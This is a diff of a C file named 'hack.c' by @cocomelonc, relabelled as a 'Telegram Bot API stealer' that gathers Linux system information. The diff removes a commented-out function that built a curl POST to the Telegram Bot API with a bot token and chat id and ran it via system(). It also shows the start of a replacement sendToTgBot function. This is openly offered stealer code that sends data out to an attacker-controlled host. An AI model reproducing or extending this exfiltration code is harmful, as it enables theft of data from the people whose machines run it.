@@ -1,7 +1,9 @@
 /*
  * hack.c
- * simple linux sysinfo (stdout-only PoC)
+ * simple linux sysinfo 
+ * Telegram Bot API stealer (+stdout PoC)
  * author: @cocomelonc
+ * https://cocomelonc.github.io/linux/2025/10/09/linux-hacking-7.html
  */
 
 #define _GNU_SOURCE
@@ -42,26 +44,6 @@ static int url_encode(const char *src, char *dst, size_t dstsz) {
 
 
 // function to send message via Telegram Bot API
-// int sendToTgBot(const char* message, const char* botToken, const char* chatId) {
-//   char command[8192];
-  
-//   // URL encode message for safe HTTP request 
-//   char encodedMessage[MSGSZ * 3 + 1];
-//   if (url_encode(message, encodedMessage, sizeof(encodedMessage)) != 0) {
-//     fprintf(stderr, "url_encode: output buffer too small\n");
-//     return 2;
-//   }
-// //   snprintf(encodedMessage, sizeof(encodedMessage), "\"%s\"", message); 
-  
-// //   // just for simplicity here 
-// //   // build the curl command to send the message to Telegram 
-// //   snprintf(command, sizeof(command), "curl -s -X POST https://api.telegram.org/bot%s/sendMessage --data-urlencode chat_id=%s --data-urlencode text=%s", botToken, chatId, encodedMessage);
-  
-//   // execute the command
-//   int result = system(command);
-//   return result;
-// }
-
 int sendToTgBot(const char* message, const char* botToken, const char* chatId) {
   // worst scenario: for earch byte %HH -> *3 + 1
   char enc[MSGSZ * 3 + 1];
